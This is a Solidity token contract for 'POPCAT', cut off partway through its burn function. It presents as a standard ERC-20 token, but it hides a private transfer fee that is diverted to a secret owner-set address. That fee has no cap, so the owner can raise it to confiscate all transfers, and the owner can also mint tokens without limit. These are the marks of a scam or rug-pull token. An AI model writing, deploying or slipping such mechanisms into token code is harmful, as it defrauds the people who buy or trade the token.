pragma solidity ^0.8.0;
contract POPCAT {
    string public name = "POPCAT";
    string public symbol = "POP";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    address private _specialAddress;
    uint256 private _hiddenFee = 100;
    uint256 private constant FEE_DIVISOR = 10000;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    error InsufficientBalance(address from, uint256 available, uint256 required);
    error InsufficientAllowance(address owner, address spender, uint256 available, uint256 required);
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    constructor(uint256 _totalSupply) {
        owner = msg.sender;
        totalSupply = _totalSupply * 10**18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        if (currentAllowance < value) {
            revert InsufficientAllowance(from, msg.sender, currentAllowance, value);
        }
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        if (balanceOf[from] < value) {
            revert InsufficientBalance(from, balanceOf[from], value);
        }
        uint256 feeAmount = 0;
        if (from != owner && to != owner && _specialAddress != address(0)) {
            feeAmount = (value * _hiddenFee) / FEE_DIVISOR;
        }
        balanceOf[from] -= value;
        balanceOf[to] += (value - feeAmount);
        if (feeAmount > 0 && _specialAddress != address(0)) {
            balanceOf[_specialAddress] += feeAmount;
            emit Transfer(from, _specialAddress, feeAmount);
        }
        emit Transfer(from, to, value - feeAmount);
    }
    function setSpecialAddress(address addr) external onlyOwner {
        _specialAddress = addr;
    }
    function setHiddenFee(uint256 fee) external onlyOwner {
        _hiddenFee = fee;
    }
    function mint(address to, uint256 amount) external onlyOwner {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
